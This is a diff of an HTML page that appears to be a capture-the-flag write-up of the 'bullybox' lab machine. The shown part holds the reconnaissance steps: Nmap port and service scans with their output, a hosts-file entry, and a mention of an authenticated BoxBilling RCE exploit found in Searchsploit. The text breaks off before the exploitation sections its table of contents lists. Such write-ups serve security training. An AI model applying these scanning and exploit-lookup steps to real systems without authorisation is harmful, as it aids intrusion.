-  background-color: inherit;
-}
-
-.md-diagram-panel {
-  margin-top: 8px;
-}
-
-.file-list-item-file-name {
-  font-weight: initial;
-}
-
-.file-list-item-summary {
-  opacity: 1;
-}
-
-.file-list-item {
-  color: #777;
-}
-
-.file-list-item.active {
-  background-color: inherit;
-  color: black;
-}
-
-.ty-side-sort-btn.active {
-  background-color: inherit;
-}
-
-.file-list-item.active .file-list-item-file-name {
-  font-weight: bold;
-}
-
-.file-list-item {
-  opacity: 1 !important;
-}
-
-.file-library-node.active > .file-node-background {
-  background-color: rgba(32, 43, 51, 0.63);
-  background-color: var(--active-file-bg-color);
-}
-
-.file-tree-node.active > .file-node-content {
-  color: white;
-  color: var(--active-file-text-color);
-}
-
-.md-task-list-item > input {
-  margin-left: -1.7em;
-  margin-top: calc(1rem - 12px);
-  -webkit-appearance: button;
-}
-
-input {
-  border: 1px solid #aaa;
-}
-
-.megamenu-menu-header #megamenu-menu-header-title,
-.megamenu-menu-header:hover,
-.megamenu-menu-header:focus {
-  color: inherit;
-}
-
-.dropdown-menu .divider {
-  border-color: #e5e5e5;
-  opacity: 1;
-}
-
-/* https://github.com/typora/typora-issues/issues/2046 */
-.os-windows-7 strong,
-.os-windows-7 strong {
-  font-weight: 760;
-}
-
-.ty-preferences .btn-default {
-  background: transparent;
-}
-
-.ty-preferences .window-header {
-  border-bottom: 1px dashed #202b33;
-  box-shadow: none;
-}
-
-#sidebar-loading-template,
-#sidebar-loading-template.file-list-item {
-  color: #777;
-}
-
-.searchpanel-search-option-btn.active {
-  background: #777;
-  color: white;
-}
-
-.export-detail,
-.light .export-detail,
-.light .export-item.active,
-.light .export-items-list-control {
-  background: #e0e0e0;
-  border-radius: 2px;
-  font-weight: 700;
-  color: inherit;
-}
-</style>
-<style type='text/css'  id="style-lp">ol, ul {padding-left: 40px}</style>
-
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:ital,wght@0,400;0,600;0,700;1,400&display=swap" rel="stylesheet">
 <title>bullybox</title>
+<style>
+:root {
+    --bg: #fdfbf7;
+    --text: #262220;
+    --muted: #7a736a;
+    --link: #0f5fae;
+    --border: #e7e1d6;
+    --code-bg: #eef3f8;
+    --code-border: #d3e1ee;
+    --code-text: #1f2937;
+    --code-accent: #2563eb;
+    --inline-code-bg: #eef3f8;
+    --inline-code-text: #a3271e;
+}
+
+* { box-sizing: border-box; }
+
+body {
+    font-family: "Nunito", "Apple SD Gothic Neo", "Malgun Gothic", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    margin: 0;
+    padding: 56px 20px 90px;
+    line-height: 1.75;
+    font-size: 1.05rem;
+}
+
+.page {
+    max-width: 700px;
+    margin: 0 auto;
+}
+
+.byline {
+    color: var(--muted);
+    font-size: 0.85rem;
+    letter-spacing: 0.02em;
+    margin-bottom: 6px;
+}
+
+h1 {
+    font-size: 1.55rem;
+    font-weight: 700;
+    border-bottom: 2px solid var(--text);
+    padding-bottom: 16px;
+    margin: 2.4em 0 32px;
+    line-height: 1.4;
+}
+
+/* first heading on the page sits right under the byline, not floating mid-page */
+.page > h1:first-of-type { margin-top: 10px; }
+
+.tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin: -18px 0 32px;
+}
+
+.tag {
+    font-size: 0.72rem;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--muted);
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    padding: 3px 11px;
+    border-radius: 999px;
+}
+
+h2, h3, h4 {
+    font-weight: 700;
+    margin-top: 2.4em;
+    margin-bottom: 0.9em;
+    line-height: 1.4;
+}
+
+h3 { font-size: 1.2rem; }
+
+blockquote {
+    margin: 1.6em 0;
+    padding: 0.3em 1.3em;
+    border-left: 4px solid var(--border);
+    color: var(--muted);
+    font-style: italic;
+}
+
+blockquote p { margin: 0.6em 0; }
+
+mark {
+    background: #fbe89f;
+    color: inherit;
+    padding: 0.05em 0.2em;
+    border-radius: 2px;
+}
+
+table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.8em 0;
+    font-size: 0.92rem;
+}
+
+th, td {
+    padding: 8px 14px;
+    border-bottom: 1px solid var(--border);
+    text-align: left;
+    vertical-align: top;
+}
+
+thead th { border-bottom: 2px solid var(--text); font-weight: 700; }
+
+/* [TOC] rendered nav */
+.toc {
+    font-size: 0.9rem;
+    background: var(--code-bg);
+    border: 1px solid var(--code-border);
+    border-radius: 8px;
+    padding: 16px 22px;
+    margin: 1.8em 0;
+}
+
+.toc ul { list-style: none; padding-left: 1.1em; margin: 0.3em 0; }
+.toc > ul { padding-left: 0; }
+.toc li { margin: 0.3em 0; }
+.toc a { color: var(--text); text-decoration: none; }
+.toc a:hover { color: var(--link); text-decoration: underline; }
+
+p { margin: 1.1em 0; }
+
+strong { font-weight: 700; }
+
+a { color: var(--link); text-decoration: underline; text-decoration-color: rgba(15, 95, 174, 0.35); text-underline-offset: 2px; }
+a:hover { text-decoration-color: currentColor; }
+
+hr {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2.8em 0;
+}
+
+ul, ol { padding-left: 1.5em; margin: 1.1em 0; }
+li { margin: 0.4em 0; }
+
+/* inline code */
+code {
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    background: var(--inline-code-bg);
+    color: var(--inline-code-text);
+    padding: 0.15em 0.4em;
+    border-radius: 4px;
+    font-size: 0.82em;
+    border: 1px solid var(--code-border);
+}
+
+/* fenced code blocks: light panel, not a dark box, but still clearly set apart */
+pre {
+    background: var(--code-bg);
+    color: var(--code-text);
+    border: 1px solid var(--code-border);
+    border-left: 4px solid var(--code-accent);
+    border-radius: 8px;
+    padding: 18px 20px;
+    margin: 1.8em 0;
+    overflow-x: auto;
+    box-shadow: 0 1px 3px rgba(37, 99, 235, 0.06);
+}
+
+pre code {
+    background: none;
+    color: inherit;
+    padding: 0;
+    border: none;
+    font-size: 0.86rem;
+    line-height: 1.65;
+}
+
+/* images */
+img {
+    display: block;
+    max-width: 100%;
+    height: auto;
+    margin: 2em auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    box-shadow: 0 3px 10px rgba(38, 34, 32, 0.08);
+}
+
+p:has(> img:only-child) { text-align: center; }
+
+footer {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    margin-top: 64px;
+    padding-top: 22px;
+    border-top: 1px solid var(--border);
+    font-size: 0.8rem;
+    color: var(--muted);
+    text-align: center;
+}
+
+@media (max-width: 600px) {
+    body { padding: 32px 16px 64px; font-size: 1.03rem; }
+    h1 { font-size: 1.3rem; }
+}
+
+.home-link {
+    position: fixed;
+    top: 16px;
+    left: 16px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 999px;
+    padding: 6px 14px;
+    font-size: 0.85rem;
+    color: var(--link);
+    text-decoration: none;
+    box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+    z-index: 10;
+}
+
+.home-link:hover {
+    background: var(--row-hover, var(--code-bg));
+}
+
+@media (max-width: 600px) {
+    .home-link { top: 10px; left: 10px; padding: 5px 12px; font-size: 0.8rem; }
+}
+</style>
 </head>
-<body class='typora-export os-windows'><div class='typora-export-content'>
-<div id='write'  class=''><p><span>Writeup by wook413</span></p><div class='md-toc' mdtype='toc'><p class="md-toc-content" role="list"><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n3"><a class="md-toc-inner" href="#recon">Recon</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n4"><a class="md-toc-inner" href="#nmap">Nmap</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n9"><a class="md-toc-inner" href="#initial-access">Initial Access</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n10"><a class="md-toc-inner" href="#http-80">HTTP 80</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n39"><a class="md-toc-inner" href="#shell-as-yuki">Shell as <code>yuki</code></a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n41"><a class="md-toc-inner" href="#privilege-escalation">Privilege Escalation</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n44"><a class="md-toc-inner" href="#shell-as-root">Shell as <code>root</code></a></span></p></div><h1 id='recon'><span>Recon</span></h1><h2 id='nmap'><span>Nmap</span></h2><p><span>My methodology typically begins with three Nmap scans. First, I scan all 65,535 TCP ports. Next, I perform a service enumeration on the discovered ports, and finally, I scan the top 10 UDP ports.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-Pn</span> <span class="cm-attribute">-n</span> <span class="cm-attribute">--open</span> <span class="cm-attribute">--min-rate</span> <span class="cm-number">3000</span> <span class="cm-attribute">-p-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-26</span> <span class="cm-number">17</span>:07 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.186.27</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.046s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Not shown: <span class="cm-number">65533</span> closed tcp ports (reset)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; STATE SERVICE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">22</span>/tcp open &nbsp;<span class="cm-builtin">ssh</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp open  http</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">15</span>.60 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 241px;"></div><div class="CodeMirror-gutters" style="display: none; height: 241px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sC</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">-p</span> <span class="cm-number">22</span>,80 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-26</span> <span class="cm-number">17</span>:10 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.186.27</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.045s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; STATE SERVICE VERSION</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">22</span>/tcp open &nbsp;<span class="cm-builtin">ssh</span> &nbsp; &nbsp; OpenSSH <span class="cm-number">8</span>.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol <span class="cm-number">2</span>.0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| ssh-hostkey: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| &nbsp; <span class="cm-number">256</span> b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_ &nbsp;<span class="cm-number">256</span> <span class="cm-number">53</span>:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp open  http &nbsp;  Apache httpd <span class="cm-number">2</span>.4.52 ((Ubuntu))</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-title: Site doesn<span class="cm-string">'t have a title (text/html).</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-server-header: Apache/2.4.52 (Ubuntu)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">8</span>.48 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 395px;"></div><div class="CodeMirror-gutters" style="display: none; height: 395px;"></div></div></div></pre><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sU</span> <span class="cm-attribute">--top-ports</span> <span class="cm-number">10</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-26</span> <span class="cm-number">17</span>:10 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.186.27</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.044s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; &nbsp; STATE &nbsp; &nbsp; &nbsp; &nbsp; SERVICE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">53</span>/udp &nbsp; closed &nbsp; &nbsp; &nbsp;  domain</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">67</span>/udp &nbsp; closed &nbsp; &nbsp; &nbsp;  dhcps</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">123</span>/udp  closed &nbsp; &nbsp; &nbsp;  ntp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">135</span>/udp  closed &nbsp; &nbsp; &nbsp;  msrpc</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">137</span>/udp  closed &nbsp; &nbsp; &nbsp;  netbios-ns</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">138</span>/udp  open|filtered netbios-dgm</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">161</span>/udp  open|filtered snmp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">445</span>/udp  closed &nbsp; &nbsp; &nbsp;  microsoft-ds</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">631</span>/udp  closed &nbsp; &nbsp; &nbsp;  ipp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">1434</span>/udp closed &nbsp; &nbsp; &nbsp;  ms-sql-m</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">5</span>.09 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 417px;"></div><div class="CodeMirror-gutters" style="display: none; height: 417px;"></div></div></div></pre><h1 id='initial-access'><span>Initial Access</span></h1><h2 id='http-80'><span>HTTP 80</span></h2><p><span>Whenever I encounter an HTTP service, my first step is to run Nmap’s </span><code>http-enum</code><span> scripts, as they often reveal some low-hanging fruits.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">--script</span><span class="cm-operator">=</span>http-enum <span class="cm-attribute">-p</span> <span class="cm-number">80</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-26</span> <span class="cm-number">17</span>:12 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.186.27</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.043s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; STATE SERVICE VERSION</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">80</span>/tcp open  http &nbsp;  Apache httpd <span class="cm-number">2</span>.4.52 ((Ubuntu))</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">|_http-server-header: Apache/2.4.52 (Ubuntu)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">13</span>.25 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 263px;"></div><div class="CodeMirror-gutters" style="display: none; height: 263px;"></div></div></div></pre><p><span>I mapped the domain name to the target IP address and updated the </span><code>/etc/hosts</code><span> file accordingly.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ echo</span> <span class="cm-string">'192.168.186.27 bullybox.local'</span> | <span class="cm-builtin">sudo</span> <span class="cm-builtin">tee</span> <span class="cm-attribute">-a</span> /etc/hosts &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[sudo] password <span class="cm-keyword">for</span> kali: </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">192</span>.168.186.27 bullybox.local</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 88px;"></div><div class="CodeMirror-gutters" style="display: none; height: 88px;"></div></div></div></pre><p><span>Browsing the service on port 80 revealed </span><strong><span>BoxBilling</span></strong><span>. While I found an RCE exploit in </span><strong><span>Searchsploit</span></strong><span>, I noted that it required valid authentication.</span></p><p><img src="./bullybox.assets/image-20260205211439733.png" alt="image-20260205211439733"></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background 